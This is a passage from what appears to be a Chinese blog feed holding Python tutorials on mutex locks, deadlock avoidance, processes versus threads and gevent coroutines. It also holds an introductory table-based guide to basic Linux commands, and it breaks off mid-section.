class="python">import threadingimport time# 创建互斥锁lock = threading.Lock()# 根据下标去取值， 保证同一时刻只能有一个线程去取值def get_value(index):    # 上锁    lock.acquire()    print(threading.current_thread())    my_list = [3,6,8,1]    # 判断下标释放越界    if index &gt;= len(my_list):        print(&quot;下标越界:&quot;, index)        return    value = my_list[index]    print(value)    time.sleep(0.2)    # 释放锁    lock.release()if __name__ == &#39;__main__&#39;:    # 模拟大量线程去执行取值操作    for i in range(30):        sub_thread = threading.Thread(target=get_value, args=(i,))        sub_thread.start()</code></pre><h5 id="5-3-避免死锁"><a href="#5-3-避免死锁" class="headerlink" title="5.3 避免死锁"></a>5.3 避免死锁</h5><ul><li>在合适的地方释放锁</li></ul><pre><code class="python">import threadingimport time# 创建互斥锁lock = threading.Lock()# 根据下标去取值， 保证同一时刻只能有一个线程去取值def get_value(index):    # 上锁    lock.acquire()    print(threading.current_thread())    my_list = [3,6,8,1]    if index &gt;= len(my_list):        print(&quot;下标越界:&quot;, index)        # 当下标越界需要释放锁，让后面的线程还可以取值        lock.release()        return    value = my_list[index]    print(value)    time.sleep(0.2)    # 释放锁    lock.release()if __name__ == &#39;__main__&#39;:    # 模拟大量线程去执行取值操作    for i in range(30):        sub_thread = threading.Thread(target=get_value, args=(i,))        sub_thread.start()</code></pre><h4 id="6-进程和线程的对比"><a href="#6-进程和线程的对比" class="headerlink" title="6.进程和线程的对比"></a>6.进程和线程的对比</h4><h5 id="6-1-进程和线程的对比的三个方向"><a href="#6-1-进程和线程的对比的三个方向" class="headerlink" title="6.1 进程和线程的对比的三个方向"></a>6.1 进程和线程的对比的三个方向</h5><ol><li>关系对比</li><li>区别对比</li><li>优缺点对比</li></ol><h5 id="6-2-关系对比"><a href="#6-2-关系对比" class="headerlink" title="6.2 关系对比"></a>6.2 关系对比</h5><ol><li>线程是依附在进程里面的，没有进程就没有线程。</li><li>一个进程默认提供一条线程，进程可以创建多个线程。</li></ol><h5 id="6-3-区别对比"><a href="#6-3-区别对比" class="headerlink" title="6.3 区别对比"></a>6.3 区别对比</h5><ol><li>进程之间不共享全局变量</li><li>线程之间共享全局变量，但是要注意资源竞争的问题，解决办法: 互斥锁或者线程同步</li><li>创建进程的资源开销要比创建线程的资源开销要大</li><li>进程是操作系统资源分配的基本单位，线程是CPU调度的基本单位</li><li>线程不能够独立执行，必须依存在进程中</li><li>多进程开发比单进程多线程开发稳定性要强</li></ol><h5 id="6-4-优缺点对比"><a href="#6-4-优缺点对比" class="headerlink" title="6.4 优缺点对比"></a>6.4 优缺点对比</h5><ul><li>进程优缺点:<ul><li>优点：可以用多核</li><li>缺点：资源开销大</li></ul></li><li>线程优缺点:<ul><li>优点：资源开销小</li><li>缺点：不能使用多核</li></ul></li></ul><h4 id="7-协程"><a href="#7-协程" class="headerlink" title="7.协程"></a>7.协程</h4><h5 id="7-1-协程是啥"><a href="#7-1-协程是啥" class="headerlink" title="7.1 协程是啥"></a>7.1 协程是啥</h5><p>协程是python个中另外一种实现多任务的方式。</p><p>只不过比线程更小占用更小执行单元（理解为需要的资源）。</p><p>通俗的理解：</p><p>在一个线程中的某个函数，可以在任何地方保存当前函数的一些临时变量等信息，然后切换到另外一个函数中执行，注意不是通过调用函数的方式做到的，并且切换的次数以及什么时候再切换到原来的函数都由开发者自己确定。</p><h5 id="7-2-协程的优点"><a href="#7-2-协程的优点" class="headerlink" title="7.2 协程的优点"></a>7.2 协程的优点</h5><p>最大的优势就是协程极高的执行效率。因为函数切换不是线程切换，而是由程序自身控制，因此，没有线程切换的开销，和多线程比，线程数量越多，协程的性能优势就越明显。</p><p>第二大优势就是不需要多线程的锁机制，因为只有一个线程，也不存在同时写变量冲突，在协程中控制共享资源不加锁，只需要判断状态就好了，所以执行效率比多线程高很多。</p><h5 id="7-3-gevent"><a href="#7-3-gevent" class="headerlink" title="7.3 gevent"></a>7.3 gevent</h5><p>gevent 是一个第三方库。</p><p>Python中仅提供了对协程的基本支持，但是不完全。而第三方的gevent为Python提供了比较完善的协程支持。</p><p>其原理是当一个任务函数遇到IO(指的是input output 输入输出，比如网络、文件操作等)操作时，比如访问网络，就自动切换到其他的任务函数执行，等到IO操作完成，再在适当的时候切换回来继续执行。</p><p>由于IO操作非常耗时，经常使程序处于等待状态，有了gevent为我们自动切换协程，就保证总有任务函数在运行，而不是等待IO,得以实现多任务,提高程序执行效率。</p><h5 id="7-4-安装"><a href="#7-4-安装" class="headerlink" title="7.4 安装"></a>7.4 安装</h5><pre><code class="python">pip3 install gevent</code></pre><h5 id="7-5-gevent的使用"><a href="#7-5-gevent的使用" class="headerlink" title="7.5 gevent的使用"></a>7.5 gevent的使用</h5><pre><code class="python">import geventdef f(n):    for i in range(n):        print(gevent.getcurrent(), i)g1 = gevent.spawn(f, 5)g2 = gevent.spawn(f, 5)g3 = gevent.spawn(f, 5)g1.join()g2.join()g3.join()</code></pre><p>运行结果</p><pre><code class="python">&lt;Greenlet at 0x10e49f550: f(5)&gt; 0&lt;Greenlet at 0x10e49f550: f(5)&gt; 1&lt;Greenlet at 0x10e49f550: f(5)&gt; 2&lt;Greenlet at 0x10e49f550: f(5)&gt; 3&lt;Greenlet at 0x10e49f550: f(5)&gt; 4&lt;Greenlet at 0x10e49f910: f(5)&gt; 0&lt;Greenlet at 0x10e49f910: f(5)&gt; 1&lt;Greenlet at 0x10e49f910: f(5)&gt; 2&lt;Greenlet at 0x10e49f910: f(5)&gt; 3&lt;Greenlet at 0x10e49f910: f(5)&gt; 4&lt;Greenlet at 0x10e49f4b0: f(5)&gt; 0&lt;Greenlet at 0x10e49f4b0: f(5)&gt; 1&lt;Greenlet at 0x10e49f4b0: f(5)&gt; 2&lt;Greenlet at 0x10e49f4b0: f(5)&gt; 3&lt;Greenlet at 0x10e49f4b0: f(5)&gt; 4</code></pre><p>可以看到，3个greenlet是依次运行而不是交替运行</p><h5 id="7-6-gevent切换执行"><a href="#7-6-gevent切换执行" class="headerlink" title="7.6 gevent切换执行"></a>7.6 gevent切换执行</h5><pre><code class="python">import geventdef f(n):    for i in range(n):        print(gevent.getcurrent(), i)        #用来模拟一个耗时操作，注意不是time模块中的sleep        gevent.sleep(1)g1 = gevent.spawn(f, 5)g2 = gevent.spawn(f, 5)g3 = gevent.spawn(f, 5)g1.join()g2.join()g3.join()</code></pre><p>运行结果</p><pre><code class="python">&lt;Greenlet at 0x7fa70ffa1c30: f(5)&gt; 0&lt;Greenlet at 0x7fa70ffa1870: f(5)&gt; 0&lt;Greenlet at 0x7fa70ffa1eb0: f(5)&gt; 0&lt;Greenlet at 0x7fa70ffa1c30: f(5)&gt; 1&lt;Greenlet at 0x7fa70ffa1870: f(5)&gt; 1&lt;Greenlet at 0x7fa70ffa1eb0: f(5)&gt; 1&lt;Greenlet at 0x7fa70ffa1c30: f(5)&gt; 2&lt;Greenlet at 0x7fa70ffa1870: f(5)&gt; 2&lt;Greenlet at 0x7fa70ffa1eb0: f(5)&gt; 2&lt;Greenlet at 0x7fa70ffa1c30: f(5)&gt; 3&lt;Greenlet at 0x7fa70ffa1870: f(5)&gt; 3&lt;Greenlet at 0x7fa70ffa1eb0: f(5)&gt; 3&lt;Greenlet at 0x7fa70ffa1c30: f(5)&gt; 4&lt;Greenlet at 0x7fa70ffa1870: f(5)&gt; 4&lt;Greenlet at 0x7fa70ffa1eb0: f(5)&gt; 4</code></pre><h5 id="7-7-给程序打补丁"><a href="#7-7-给程序打补丁" class="headerlink" title="7.7 给程序打补丁"></a>7.7 给程序打补丁</h5><pre><code class="python">from gevent import monkeyimport geventimport randomimport timedef coroutine_work(coroutine_name):    for i in range(10):        print(coroutine_name, i)        time.sleep(random.random())gevent.joinall([        gevent.spawn(coroutine_work, &quot;work1&quot;),        gevent.spawn(coroutine_work, &quot;work2&quot;)])</code></pre><p>运行结果</p><pre><code class="python">work1 0work1 1work1 2work1 3work1 4work1 5work1 6work1 7work1 8work1 9work2 0work2 1work2 2work2 3work2 4work2 5work2 6work2 7work2 8work2 9from gevent import monkeyimport geventimport randomimport time# 有耗时操作时需要monkey.patch_all()  # 将程序中用到的耗时操作的代码，换为gevent中自己实现的模块def coroutine_work(coroutine_name):    for i in range(10):        print(coroutine_name, i)        time.sleep(random.random())gevent.joinall([        gevent.spawn(coroutine_work, &quot;work1&quot;),        gevent.spawn(coroutine_work, &quot;work2&quot;)])</code></pre><p>运行结果</p><pre><code class="python">work1 0work2 0work1 1work1 2work1 3work2 1work1 4work2 2work1 5work2 3work1 6work1 7work1 8work2 4work2 5work1 9work2 6work2 7work2 8work2 9</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python高级01-Linux基本使用</title>
      <link href="/2020/08/04/2020-08-05-python%E9%AB%98%E7%BA%A701-Linux%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
      <url>/2020/08/04/2020-08-05-python%E9%AB%98%E7%BA%A701-Linux%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="第一章：Linux基本使用"><a href="#第一章：Linux基本使用" class="headerlink" title="第一章：Linux基本使用"></a>第一章：Linux基本使用</h2><h3 id="第1节：Linux系统使用"><a href="#第1节：Linux系统使用" class="headerlink" title="第1节：Linux系统使用"></a>第1节：Linux系统使用</h3><h4 id="1-Linux基础命令使用"><a href="#1-Linux基础命令使用" class="headerlink" title="1.Linux基础命令使用"></a>1.Linux基础命令使用</h4><a id="more"></a><h5 id="1-1-查看目录命令的使用"><a href="#1-1-查看目录命令的使用" class="headerlink" title="1.1 查看目录命令的使用"></a>1.1 查看目录命令的使用</h5><table><thead><tr><th align="left">命令</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">ls</td><td align="left">查看当前目录信息</td></tr><tr><td align="left">tree</td><td align="left">以树状方式显示目录信息</td></tr></tbody></table><h5 id="1-2-查看当前目录路径"><a href="#1-2-查看当前目录路径" class="headerlink" title="1.2 查看当前目录路径"></a>1.2 查看当前目录路径</h5><table><thead><tr><th align="left">命令</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">pwd</td><td align="left">查看当前目录路径</td></tr></tbody></table><h5 id="1-3-清除终端内容"><a href="#1-3-清除终端内容" class="headerlink" title="1.3 清除终端内容"></a>1.3 清除终端内容</h5><table><thead><tr><th align="left">命令</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">clear</td><td align="left">清除终端内容</td></tr></tbody></table><h5 id="1-4-切换目录命令的使用"><a href="#1-4-切换目录命令的使用" class="headerlink" title="1.4 切换目录命令的使用"></a>1.4 切换目录命令的使用</h5><table><thead><tr><th align="left">命令</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">cd 目录</td><td align="left">切换到指定目录</td></tr><tr><td align="left">cd ~</td><td align="left">切换到当前用户的主目录</td></tr><tr><td align="left">cd ..</td><td align="left">切换到上一级目录</td></tr><tr><td align="left">cd .</td><td align="left">切换到当前目录</td></tr><tr><td align="left">cd -</td><td align="left">切换到上一次目录</td></tr></tbody></table><p><strong>注意:</strong></p><ul><li>cd命令切换目录时，这个目录必须存在。</li><li>cd 后面不写目录等价于cd ~</li></ul><h5 id="1-5-绝对路径"><a href="#1-5-绝对路径" class="headerlink" title="1.5 绝对路径"></a>1.5 绝对路径</h5><p>从根目录算起的路径叫做绝对路径</p><p><strong>例如:</strong></p><ul><li>/home/python/Desktop</li><li>/usr/bin</li></ul><h5 id="1-6-相对路径"><a href="#1-6-相对路径" class="headerlink" title="1.6 相对路径"></a>1.6 相对路径</h5><p>从当前目录算起的路径叫做相对路径</p><p><strong>例如:</strong></p><ul><li>./test/hello</li><li>../static/images</li></ul><h5 id="1-7-绝对路径和相对路径的使用"><a href="#1-7-绝对路径和相对路径的使用" class="headerlink" title="1.7 绝对路径和相对路径的使用"></a>1.7 绝对路径和相对路径的使用</h5><ol><li>使用绝对路径切换到桌面<br>cd /home/python/Desktop</li><li>在下载目录以相对路径切换到桌面<br>cd Downloads<br>cd ../Desktop</li><li>在桌面使用相对路径切换到上一级目录的上一级目录 cd Desktop cd ../../</li></ol><h5 id="1-8-自动补全"><a href="#1-8-自动补全" class="headerlink" title="1.8 自动补全"></a>1.8 自动补全</h5><ul><li>当敲出 文件或者目录或者命令 的前几个字母之后，按下 tab 键，如果输入的没有歧义，系统会自动补全</li><li>当切换目录或者使用命令的时候，如果不确定当前目录下有那些子目录或者其它命令，可以通过两次tab键查看</li></ul><h5 id="1-9-创建、删除文件及目录命令的使用"><a href="#1-9-创建、删除文件及目录命令的使用" class="headerlink" title="1.9 创建、删除文件及目录命令的使用"></a>1.9 创建、删除文件及目录命令的使用</h5><table><thead><tr><th align="left">命令</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">touch 文件名</td><td align="left">创建指定文件</td></tr><tr><td align="left">mkdir 目录名</td><td align="left">创建目录(文件夹)</td></tr><tr><td align="left">rm 文件名或者目录名</td><td align="left">删除指定文件或者目录</td></tr><tr><td align="left">rmdir 目录名</td><td align="left">删除空目录</td></tr></tbody></table><h5 id="1-10-复制、移动文件及目录命令的使用"><a href="#1-10-复制、移动文件及目录命令的使用" class="headerlink" title="1.10 复制、移动文件及目录命令的使用"></a>1.10 复制、移动文件及目录命令的使用</h5><table><thead><tr><th align="left">命令</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">cp</td><td align="left">拷贝文件、拷贝目录</td></tr><tr><td align="left">mv</td><td align="left">移动文件、移动目录、重命名</td></tr></tbody></table><h5 id="1-11-终端命令格式说明"><a href="#1-11-终端命令格式说明" class="headerlink" title="1.11 终端命令格式说明"></a>1.11 终端命令格式说明</h5><p><strong>command</strong> [-options] [parameter]</p><p><strong>每项信息的说明:</strong></p><ul><li>command：命令名, 比如: ls、pwd</li><li>[-options]：选项，可以有零个、一个或者多个选项，多个选项可以合并，比如使用的 -r 就是选项。</li><li>[parameter]：参数，可以有零个、一个 或者 多个参数， 比如: touch 文件名、mkdir 目录名、cd 目标目录(路径)，这些文件名和目录名都是参数。</li><li>[]：代表可选</li></ul><h5 id="1-12-查看命令帮助方式"><a href="#1-12-查看命令帮助方式" class="headerlink" title="1.12 查看命令帮助方式"></a>1.12 查看命令帮助方式</h5><ul><li>–help 使用说明: 命令 –help</li><li>man 使用说明: man 命令</li></ul><p><strong>man命令的说明:</strong></p><table><thead><tr><th align="left">操作键</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">空格</td><td align="left">显示下一屏信息</td></tr><tr><td align="left">回车</td><td align="left">显示下一行信息</td></tr><tr><td align="left">b</td><td align="left">显示上一屏信息</td></tr><tr><td align="left">f</td><td align="left">显示下一屏信息</td></tr><tr><td align="left">q</td><td align="left">退出</td></tr></tbody></table><h4 id="2-Linux命令选项的使用"><a href="#2-Linux命令选项的使用" class="headerlink" title="2.Linux命令选项的使用"></a>2.Linux命令选项的使用</h4><h5 id="2-1-ls命令选项使用"><a href="#2-1-ls命令选项使用" class="headerlink" title="2.1 ls命令选项使用"></a>2.1 ls命令选项使用</h5><table><thead><tr><th align="left">命令选项</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">-l</td><td align="left">以列表方式显示</td></tr><tr><td align="left">-h</td><td align="left">以大小单位显示，默认是字节</td></tr><tr><td align="left">-a</td><td align="left">显示隐藏文件和隐藏目录</td></tr></tbody></table><h5 id="2-2-mkdir命令选项"><a href="#2-2-mkdir命令选项" class="headerlink" title="2.2 mkdir命令选项"></a>2.2 mkdir命令选项</h5><table><thead><tr><th align="left">命令选项</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">-p</td><td align="left">创建所依赖的文件夹</td></tr></tbody></table><h5 id="2-3-rm命令选项"><a href="#2-3-rm命令选项" class="headerlink" title="2.3 rm命令选项"></a>2.3 rm命令选项</h5><table><thead><tr><th align="left">命令选项</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">-i</td><td align="left">交互式提示</td></tr><tr><td align="left">-r</td><td align="left">递归删除目录及其内容</td></tr><tr><td align="left">-f</td><td align="left">强制删除，忽略不存在的文件，无需提示</td></tr><tr><td align="left">-d</td><td align="left">删除空目录</td></tr></tbody></table><h5 id="2-4-cp命令选项"><a href="#2-4-cp命令选项" class="headerlink" title="2.4 cp命令选项"></a>2.4 cp命令选项</h5><table><thead><tr><th align="left">命令选项</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">-i</td><td align="left">交互式提示</td></tr><tr><td align="left">-r</td><td align="left">递归拷贝目录及其内容</td></tr><tr><td align="left">-v</td><td align="left">显示拷贝后的路径描述</td></tr><tr><td align="left">-a</td><td align="left">保留文件的原有权限</td></tr></tbody></table><h5 id="2-5-mv命令选项"><a href="#2-5-mv命令选项" class="headerlink" title="2.5 mv命令选项"></a>2.5 mv命令选项</h5><table><thead><tr><th align="left">命令选项</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">-i</td><td align="left">交互式提示</td></tr><tr><td align="left">-v</td><td align="left">显示移动后的路径描述</td></tr></tbody></table><h4 id="3-Linux高级命令使用"><a href="#3-Linux高级命令使用" class="headerlink" title="3. Linux高级命令使用"></a>3. Linux高级命令使用</h4><h5 id="3-1-重定向命令的使用"><a href="#3-1-重定向命令的使用" class="headerlink" title="3.1 重定向命令的使用"></a>3.1 重定向命令的使用</h5><table><thead><tr><th align="left">命令</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">&gt;</td><td align="left">如果文件存在会覆盖原有文件内容，相当于文件操作中的‘w’模式</td></tr><tr><td align="left">&gt;&gt;</td><td align="left">如果文件存在会追加写入文件末尾，相当于文件操作中的‘a’ 模式</td></tr></tbody></table><p><strong>说明:</strong></p><p>只要在终端能显示信息的命令都可以使用重定向，比如: tree</p><h5 id="3-2-查看文件内容命令的使用"><a href="#3-2-查看文件内容命令的使用" class="headerlink" title="3.2 查看文件内容命令的使用"></a>3.2 查看文件内容命令的使用</h5><table><thead><tr><th align="left">命令</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">cat</td><td align="left">查看小型文件</td></tr><tr><td align="left">more</td><td align="left">分屏查看大型文件</td></tr></tbody></table><p><strong>说明:</strong></p><ul><li>cat命令结合重定向可以完成多个文件的合并</li><li>gedit 文件编辑命令，可以查看和编辑文件</li></ul><p><strong>more命令的效果图</strong></p><p>当查看内容信息过长无法在一屏上显示时，可以使用 more 命令在终端分屏显示文件内容。</p><p><strong>操作键说明:</strong></p><table><thead><tr><th align="left">操作键</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">空格</td><td align="left">显示下一屏信息</td></tr><tr><td align="left">回车</td><td align="left">显示下一行信息</td></tr><tr><td align="left">b</td><td align="left">显示上一屏信息</td></tr><tr><td align="left">f</td><td align="left">显示下一屏信息</td></tr><tr><td align="left">q</td><td align="left">退出</td></tr></tbody></table><h5 id="3-3-管道-命令的使用"><a href="#3-3-管道-命令的使用" class="headerlink" title="3.3 管道(|)命令的使用"></a>3.3 管道(|)命令的使用</h5><p>管道(|)：一个命令的输出可以通过管道做为另一个命令的输入，可以理解成是一个容器，存放在终端显示的内容。</p><p><strong>说明:</strong></p><p>管道(|)一般结合 more 命令使用，主要是分配查看终端显示内容。</p><h5 id="3-4-链接命令的使用"><a href="#3-4-链接命令的使用" class="headerlink" title="3.4 链接命令的使用"></a>3.4 链接命令的使用</h5><p>链接命令是创建链接文件，链接文件分为:</p><ul><li>软链接</li><li>硬链接</li></ul><table><thead><tr><th align="left">命令</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">ln -s</td><td align="left">创建软链接</td></tr><tr><td align="left">ln</td><td align="left">创建硬链接</td></tr></tbody></table><h6 id="3-4-1-软链接"><a href="#3-4-1-软链接" class="headerlink" title="3.4.1 软链接"></a>3.4.1 软链接</h6><p>类似于<strong>Windows下的快捷方式</strong>，当一个源文件的目录层级比较深，我们想要方便使用它可以给源文件创建一个软链接。</p><p><strong>注意点:</strong></p><ul><li><strong>如果软链接和源文件不在同一个目录，源文件要使用绝对路径，不能使用相对路径。</strong></li><li><strong>删除源文件则软链接失效</strong></li><li><strong>可以给目录创建软链接</strong></li></ul><h6 id="3-4-2-硬链接"><a href="#3-4-2-硬链接" class="headerlink" title="3.4.2 硬链接"></a>3.4.2 硬链接</h6><p>类似于<strong>源文件的一个别名</strong>，也就是说这两个名字指向的是同一个文件数据。</p><p><strong>注意点:</strong></p><ul><li><strong>创建硬链接使用相对路径和绝对路径都可以</strong></li><li><strong>删除源文件，硬链接还可以访问到数据。</strong></li><li><strong>创建硬链接，硬链接数会加1，删除源文件或者硬链接，硬链接数会减1。</strong></li><li><strong>创建软链接，硬链接数不会加1</strong></li><li><strong>不能给目录创建硬链接</strong></li></ul><p><strong>硬链接数:</strong></p><p><strong>硬链接数就是文件数据被文件名使用的次数, 好比引用计数</strong></p><h5 id="3-5-grep命令的使用"><a href="#3-5-grep命令的使用" class="headerlink" title="3.5 grep命令的使用"></a>3.5 grep命令的使用</h5><table><thead><tr><th align="left">命令</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">grep</td><td align="left">文本搜索</td></tr></tbody></table><h6 id="3-5-1-grep命令选项的使用"><a href="#3-5-1-grep命令选项的使用" class="headerlink" title="3.5.1  grep命令选项的使用"></a>3.5.1  grep命令选项的使用</h6><table><thead><tr><th align="left">命令选项</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">-i</td><td align="left">忽略大小写</td></tr><tr><td align="left">-n</td><td align="left">显示匹配行号</td></tr><tr><td align="left">-v</td><td align="left">显示不包含匹配文本的所有行</td></tr></tbody></table><h6 id="3-5-2-grep命令结合正则表达式的使用"><a href="#3-5-2-grep命令结合正则表达式的使用" class="headerlink" title="3.5.2 grep命令结合正则表达式的使用"></a>3.5.2 grep命令结合正则表达式的使用</h6><table><thead><tr><th align="left">正则表达式</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">^</td><td align="left">以指定字符串开头</td></tr><tr><td align="left">$</td><td align="left">以指定字符串结尾</td></tr><tr><td align="left">.</td><td align="left">匹配一个非换行符的字符</td></tr></tbody></table><h5 id="3-6-find命令及选项的使用"><a href="#3-6-find命令及选项的使用" class="headerlink" title="3.6  find命令及选项的使用"></a>3.6  find命令及选项的使用</h5><table><thead><tr><th align="left">命令</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">find</td><td align="left">在指定目录下查找文件(包括目录)</td></tr></tbody></table><p><strong>find命令选项:</strong></p><table><thead><tr><th align="left">选项</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">-name</td><td align="left">根据文件名(包括目录名)字查找</td></tr></tbody></table><h6 id="3-6-1-find命令结合通配符的使用"><a href="#3-6-1-find命令结合通配符的使用" class="headerlink" title="3.6.1 find命令结合通配符的使用"></a>3.6.1 find命令结合通配符的使用</h6><p><strong>通配符:</strong></p><p>是一种特殊语句，主要有星号(*)和问号(?)，用来模糊搜索文件</p><table><thead><tr><th align="left">通配符</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">*</td><td align="left">代表0个或多个任意字符</td></tr><tr><td align="left">?</td><td align="left">代表任意一个字符</td></tr></tbody></table><p><strong>扩展:</strong></p><p>通配符不仅能结合 <strong>find</strong> 命令使用，还可以结合其它命令使用, 比如: <strong>ls、mv、cp</strong> 等，这里需要注意只有 <strong>find</strong> 命令使用通配符需要加上引号。</p><h5 id="3-7-tar命令及选项的使用"><a href="#3-7-tar命令及选项的使用" class="headerlink" title="3.7 tar命令及选项的使用"></a>3.7 tar命令及选项的使用</h5><table><thead><tr><th align="left">命令</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">tar</td><td align="left">压缩和解压缩命令</td></tr></tbody></table><p><strong>tar命令选项:</strong></p><table><thead><tr><th align="left">选项</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">-c</td><td align="left">创建打包文件</td></tr><tr><td align="left">-v</td><td align="left">显示打包或者解包的详细信息</td></tr><tr><td align="left">-f</td><td align="left">指定文件名称, 必须放到所有选项后面</td></tr><tr><td align="left">-z</td><td align="left">压缩或解压缩(.gz)</td></tr><tr><td align="left">-j</td><td align="left">压缩或解压缩(.bz2)</td></tr><tr><td align="left">-x</td><td align="left">解包</td></tr><tr><td align="left">-C</td><td align="left">解压缩到指定目录</td></tr></tbody></table><h5 id="3-8-zip和unzip命令及选项的使用"><a href="#3-8-zip和unzip命令及选项的使用" class="headerlink" title="3.8 zip和unzip命令及选项的使用"></a>3.8 zip和unzip命令及选项的使用</h5><table><thead><tr><th align="left">命令</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">zip</td><td align="left">压缩成.zip格式文件</td></tr><tr><td align="left">unzip</td><td align="left">解压缩.zip格式文件</td></tr></tbody></table><p><strong>unzip命令选项:</strong></p><table><thead><tr><th align="left">选项</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">-d</td><td align="left">解压缩到指定目录</td></tr></tbody></table><p><strong>说明:</strong></p><ul><li>压缩文件尽量使用.bz2格式，因为占用空间较少</li><li>使用zip命令压缩的文件占用空间比较多, 当时比较通用，操作更加简单。</li></ul><h5 id="3-9-chmod命令的介绍"><a href="#3-9-chmod命令的介绍" class="headerlink" title="3.9 chmod命令的介绍"></a>3.9 chmod命令的介绍</h5><table><thead><tr><th align="left">命令</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">chmod</td><td align="left">修改文件权限</td></tr></tbody></table><p>chmod修改文件权限有两种方式:</p><ul><li>字母法</li><li>数字法</li></ul><h6 id="3-91-chmod-字母法的使用"><a href="#3-91-chmod-字母法的使用" class="headerlink" title="3.91 chmod 字母法的使用"></a>3.91 chmod 字母法的使用</h6><p><strong>角色说明:</strong></p><table><thead><tr><th align="left">角色</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">u</td><td align="left">user, 表示该文件的所有者</td></tr><tr><td align="left">g</td><td align="left">group, 表示用户组</td></tr><tr><td align="left">o</td><td align="left">other, 表示其他用户</td></tr><tr><td align="left">a</td><td align="left">all, 表示所有用户</td></tr></tbody></table><p><strong>权限设置说明:</strong></p><table><thead><tr><th align="left">操作符</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">+</td><td align="left">增加权限</td></tr><tr><td align="left">-</td><td align="left">撤销权限</td></tr><tr><td align="left">=</td><td align="left">设置权限</td></tr></tbody></table><p><strong>权限说明:</strong></p><table><thead><tr><th align="left">权限</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">r</td><td align="left">可读</td></tr><tr><td align="left">w</td><td align="left">可写</td></tr><tr><td align="left">x</td><td align="left">可执行</td></tr><tr><td align="left">-</td><td align="left">无任何权限</td></tr></tbody></table><h6 id="3-9-2-chmod-数字法的使用"><a href="#3-9-2-chmod-数字法的使用" class="headerlink" title="3.9.2 chmod 数字法的使用"></a>3.9.2 chmod 数字法的使用</h6><p>数字法就是“rwx” 这些权限也可以用<strong>数字来代替</strong></p><p><strong>权限说明:</strong></p><table><thead><tr><th align="left">权限</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">r</td><td align="left">可读，权限值是4</td></tr><tr><td align="left">w</td><td align="left">可写，权限值是2</td></tr><tr><td align="left">x</td><td align="left">可执行，权限值是1</td></tr><tr><td align="left">-</td><td align="left">无任何权限，权限值是0</td></tr></tbody></table><h5 id="3-10-sudo命令的使用"><a href="#3-10-sudo命令的使用" class="headerlink" title="3.10 sudo命令的使用"></a>3.10 sudo命令的使用</h5><table><thead><tr><th align="left">命令</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">sudo -s</td><td align="left">切换到root用户，获取管理员权限</td></tr><tr><td align="left">sudo</td><td align="left">某个命令的执行需要获取管理员权限可以在执行命令前面加上sudo</td></tr></tbody></table><h5 id="3-11-whoami命令的使用"><a href="#3-11-whoami命令的使用" class="headerlink" title="3.11 whoami命令的使用"></a>3.11 whoami命令的使用</h5><table><thead><tr><th align="left">命令</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">whoami</td><td align="left">查看当前用户</td></tr></tbody></table><h5 id="3-12-exit命令的使用"><a href="#3-12-exit命令的使用" class="headerlink" title="3.12 exit命令的使用"></a>3.12 exit命令的使用</h5><table><thead><tr><th align="left">命令</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">exit</td><td align="left">退出登录用户</td></tr></tbody></table><h5 id="3-13-who命令的使用"><a href="#3-13-who命令的使用" class="headerlink" title="3.13 who命令的使用"></a>3.13 who命令的使用</h5><table><thead><tr><th align="left">命令</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">who</td><td align="left">查看所有的登录用户</td></tr></tbody></table><h5 id="3-14-passwd命令的使用"><a href="#3-14-passwd命令的使用" class="headerlink" title="3.14 passwd命令的使用"></a>3.14 passwd命令的使用</h5><table><thead><tr><th align="left">命令</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">passwd</td><td align="left">修改用户密码，不指定用户默认修改当前登录用户密码</td></tr></tbody></table><h5 id="3-15-which命令的使用"><a href="#3-15-which命令的使用" class="headerlink" title="3.15 which命令的使用"></a>3.15 which命令的使用</h5><table><thead><tr><th align="left">命令</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">which</td><td align="left">查看命令位置</td></tr></tbody></table><h5 id="3-16-关机和重启命令的使用"><a href="#3-16-关机和重启命令的使用" class="headerlink" title="3.16 关机和重启命令的使用"></a>3.16 关机和重启命令的使用</h5><table><thead><tr><th align="left">命令</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">shutdown –h now  或者 poweroff</td><td align="left">立刻关机</td></tr><tr><td align="left">reboot</td><td align="left">重启</td></tr></tbody></table><h5 id="3-17-useradd创建用户"><a href="#3-17-useradd创建用户" class="headerlink" title="3.17 